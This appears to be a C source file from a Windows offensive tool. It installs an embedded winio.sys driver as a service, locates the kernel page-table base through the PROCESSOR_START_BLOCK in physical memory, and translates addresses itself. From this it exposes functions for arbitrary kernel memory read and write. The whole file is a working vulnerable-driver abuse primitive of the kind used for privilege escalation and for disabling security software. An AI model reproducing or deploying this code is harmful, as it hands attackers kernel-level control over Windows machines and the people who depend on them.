#include "stdafx.h"

// winio.sys driver binary
#include "winio_sys.h"

/*
    PROCESSOR_START_BLOCK is allocated by winload.efi, so it could be
    anywhere in the low memory.
*/
#define PROCESSOR_START_BLOCK_MIN 0
#define PROCESSOR_START_BLOCK_MAX 0x10000

#pragma pack(push, 2)

typedef struct _FAR_JMP_16
{
    BYTE OpCode; // = 0xe9
    WORD Offset;

} FAR_JMP_16;

typedef struct _PSEUDO_DESCRIPTOR_32
{
    WORD Limit;
    DWORD Base;

} PSEUDO_DESCRIPTOR_32;

#pragma pack(pop)

typedef struct _PROCESSOR_START_BLOCK *PPROCESSOR_START_BLOCK;
typedef struct _PROCESSOR_START_BLOCK
{
    // The block starts with a jmp instruction to the end of the block
    FAR_JMP_16 Jmp;

    // Completion flag is set to non-zero when the target processor has
    // started
    DWORD CompletionFlag;

    // Pseudo descriptors for GDT and IDT
    PSEUDO_DESCRIPTOR_32 Gdt32;
    PSEUDO_DESCRIPTOR_32 Idt32;

    // ...

} PROCESSOR_START_BLOCK,
*PPROCESSOR_START_BLOCK;

// other fields offsets
#define PROCESSOR_START_BLOCK_HalpLMStub    0x70
#define PROCESSOR_START_BLOCK_Cr3           0xa0

// PML4 base of the kernel virtual address space
static DWORD_PTR m_PML4_Addr = 0;

// loldriver device handle
static HANDLE m_hDevice = NULL;
//--------------------------------------------------------------------------------------
static BOOL DriverInitPageTableBase(void)
{
    BOOL bRet = FALSE;

    // allocate memory to read PROCESSOR_START_BLOCK
    PUCHAR Data = (PUCHAR)M_ALLOC(PAGE_SIZE);
    if (Data == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "M_ALLOC() ERROR %d\n", GetLastError());
        return FALSE;
    }

    // find an exact location of the PROCESSOR_START_BLOCK
    for (DWORD_PTR Addr = PROCESSOR_START_BLOCK_MIN; 
                   Addr < PROCESSOR_START_BLOCK_MAX; Addr += PAGE_SIZE)
    {
        if (WinioPhysRead(m_hDevice, Addr, PAGE_SIZE, Data))
        {
            PPROCESSOR_START_BLOCK Info = (PPROCESSOR_START_BLOCK)Data;

            // get page table address and HalpLMStub address
            DWORD_PTR PML4_Addr = *(DWORD_PTR *)(Data + PROCESSOR_START_BLOCK_Cr3);
            DWORD_PTR HalpLMStub = *(DWORD_PTR *)(Data + PROCESSOR_START_BLOCK_HalpLMStub);            

            // check for the sane values
            if (Info->Jmp.OpCode != 0xe9 || Info->CompletionFlag != 1 || HalpLMStub == 0 || PML4_Addr == 0)
            {
                // looks bad
                continue;
            }

            DbgMsg(__FILE__, __LINE__, "PROCESSOR_START_BLOCK is at "IFMT"\n", Addr);
            DbgMsg(__FILE__, __LINE__, "Kernel mode PML4 address is "IFMT"\n", PML4_Addr);

            m_PML4_Addr = PML4_Addr;
            
            bRet = TRUE;
            break;
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: WinioPhysMemRead() fails\n");
            break;
        }
    }

    M_FREE(Data);

    return bRet;
}
//--------------------------------------------------------------------------------------
static BOOL DriverVirtToPhys(DWORD_PTR PML4_Addr, PVOID AddrVirt, PDWORD_PTR pAddrPhys)
{    
    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4_entry;    

    DWORD_PTR AddrPhys = PML4_ADDRESS(PML4_Addr) + PML4_INDEX(AddrVirt) * sizeof(DWORD64);

    if (m_hDevice == NULL)
    {
        // not initialized
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Not initialized\n");
        return FALSE;
    }

    // read PML4 entry
    if (!WinioPhysRead(m_hDevice, AddrPhys, sizeof(PML4_entry), &PML4_entry.Uint64))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: WinioPhysMemRead() fails\n");
        return FALSE;
    }

    // check if PML4 entry is present
    if (PML4_entry.Bits.Present == 0)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: PML4E for "IFMT" is not present\n", AddrVirt);
        return FALSE;
    }

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPT_entry;

    AddrPhys = PFN_TO_PAGE(PML4_entry.Bits.PageTableBaseAddress) + PDPT_INDEX(AddrVirt) * sizeof(DWORD64);

    // read PDPT entry
    if (!WinioPhysRead(m_hDevice, AddrPhys, sizeof(PDPT_entry), &PDPT_entry.Uint64))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: WinioPhysMemRead() fails\n");
        return FALSE;
    }

    // check if PDPT entry is present
    if (PDPT_entry.Bits.Present == 0)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: PDPTE for "IFMT" is not present\n", AddrVirt);
        return FALSE;
    }

    // check for page size flag
    if ((PDPT_entry.Uint64 & PDPTE_PDE_PS) == 0)
    {
        X64_PAGE_DIRECTORY_ENTRY_4K PD_entry;

        AddrPhys = PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress) + PDE_INDEX(AddrVirt) * sizeof(DWORD64);

        // read PD entry
        if (!WinioPhysRead(m_hDevice, AddrPhys, sizeof(PD_entry), &PD_entry.Uint64))
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: WinioPhysMemRead() fails\n");
            return FALSE;
        }

        // check if PD entry is present
        if (PD_entry.Bits.Present == 0)
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: PDE for "IFMT" is not present\n", AddrVirt);
            return FALSE;
        }

        // check for page size flag
        if ((PD_entry.Uint64 & PDPTE_PDE_PS) == 0)
        {
            X64_PAGE_TABLE_ENTRY_4K PT_entry;

            AddrPhys = PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) + PTE_INDEX(AddrVirt) * sizeof(DWORD64);

            // read PT entry
            if (!WinioPhysRead(m_hDevice, AddrPhys, sizeof(PD_entry), &PT_entry.Uint64))
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: WinioPhysMemRead() fails\n");
                return FALSE;
            }

            // check if PT entry is present
            if (PT_entry.Bits.Present)
            {
                // calculate 4Kb physical page address
                *pAddrPhys = PFN_TO_PAGE(PT_entry.Bits.PageTableBaseAddress) + PAGE_OFFSET_4K(AddrVirt);
                return TRUE;
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: PTE for "IFMT" is not present\n", AddrVirt);
            }
        }
        else
        {
            // calculate 2Mb page physical page address
            *pAddrPhys = PFN_TO_PAGE(PD_entry.Bits.PageTableBaseAddress) + PAGE_OFFSET_2M(AddrVirt);
            return TRUE;
        }                  
    }
    else
    {
        // calculate 1Gb page physical page address
        *pAddrPhys = PFN_TO_PAGE(PDPT_entry.Bits.PageTableBaseAddress) + PAGE_OFFSET_1G(AddrVirt);
        return TRUE;
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
BOOL DriverInit(void)
{
    BOOL bStarted = FALSE;
    char szFilePath[MAX_PATH];

    if (m_hDevice != NULL)
    {
        // already initialized
        return TRUE;
    }

    if (!LoadPrivileges(SE_LOAD_DRIVER_NAME))
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: LoadPrivileges() fails\n");
        return FALSE;
    }

    // make driver file path
    GetSystemDirectory(szFilePath, MAX_PATH);
    strcat(szFilePath, "\\drivers\\" WINIO_DRIVER_NAME);

    // first try to start already existing service
    if (!(bStarted = ServiceStart(WINIO_SERVICE_NAME, szFilePath, FALSE)))
    {
        // copy driver into the drivers directory
        if (DumpToFile(szFilePath, winio_sys, sizeof(winio_sys)))
        {
            // try to create new service
            if (!(bStarted = ServiceStart(WINIO_SERVICE_NAME, szFilePath, TRUE)))
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: ServiceStart() fails\n");

                // remove driver
                DeleteFile(szFilePath);
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DumpToFile() fails\n");
        }
    }

    // copy driver into the drivers directory
    if (bStarted)
    {
        // get handle of the target device
        if ((m_hDevice = CreateFile(
            WINIO_DEVICE_PATH, GENERIC_READ | GENERIC_WRITE, 0,
            NULL, OPEN_EXISTING, 0, NULL)) != INVALID_HANDLE_VALUE)
        {
            DbgMsg(__FILE__, __LINE__, "%s kernel driver was successfully loaded\n", WINIO_DRIVER_NAME);

            // initialize PML4 address
            if (DriverInitPageTableBase())
            {
                return TRUE;
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: DriverInit() fails\n");
            }

            CloseHandle(m_hDevice);
            m_hDevice = NULL;
        }

        // remove service
        ServiceStop(WINIO_SERVICE_NAME);
        ServiceRemove(WINIO_SERVICE_NAME);

        // remove driver
        DeleteFile(szFilePath);
    }

    return FALSE;
}
//--------------------------------------------------------------------------------------
BOOL DriverUninit(void)
{
    char szFilePath[MAX_PATH];

    if (m_hDevice == NULL)
    {
        // not initialized
        return TRUE;
    }

    CloseHandle(m_hDevice);
    m_hDevice = NULL;

    // make driver file path
    GetSystemDirectory(szFilePath, MAX_PATH);
    strcat(szFilePath, "\\drivers\\" WINIO_DRIVER_NAME);

    // remove service
    ServiceStop(WINIO_SERVICE_NAME);
    ServiceRemove(WINIO_SERVICE_NAME);

    // remove driver
    DeleteFile(szFilePath);

    return TRUE;
}
//--------------------------------------------------------------------------------------
BOOL DriverMemWrite(PVOID Addr, PVOID Data, DWORD_PTR DataSize)
{
    DWORD_PTR AddrPhys = 0;

    if (m_hDevice == NULL)
    {
        // not initialized
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Not initialized\n");
        return FALSE;
    }

    // translate virtual address to physical
    if (DriverVirtToPhys(m_PML4_Addr, Addr, &AddrPhys))
    {
        // write to the physical memory location
        if (WinioPhysWrite(m_hDevice, AddrPhys, DataSize, Data))
        {
            return TRUE;
        }
    }

    return FALSE;
}

BOOL DriverMemWritePtr(PVOID Addr, PVOID Value)
{
    // write single pointer at virtual memory address
    return DriverMemWrite(Addr, &Value, sizeof(PVOID));
}
//--------------------------------------------------------------------------------------
BOOL DriverMemRead(PVOID Addr, PVOID Data, DWORD_PTR DataSize)
{
    DWORD_PTR AddrPhys = 0;

    if (m_hDevice == NULL)
    {
        // not initialized
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Not initialized\n");
        return FALSE;
    }

    // translate virtual address to physical
    if (DriverVirtToPhys(m_PML4_Addr, Addr, &AddrPhys))
    {
        // read from the physical memory location
        if (WinioPhysRead(m_hDevice, AddrPhys, DataSize, Data))
        {
            return TRUE;
        }
    }

    return FALSE;
}

BOOL DriverMemReadPtr(PVOID Addr, PVOID *Value)
{
    // read single pointer from virtual memory address
    return DriverMemRead(Addr, Value, sizeof(PVOID));
}
//--------------------------------------------------------------------------------------
// EoF
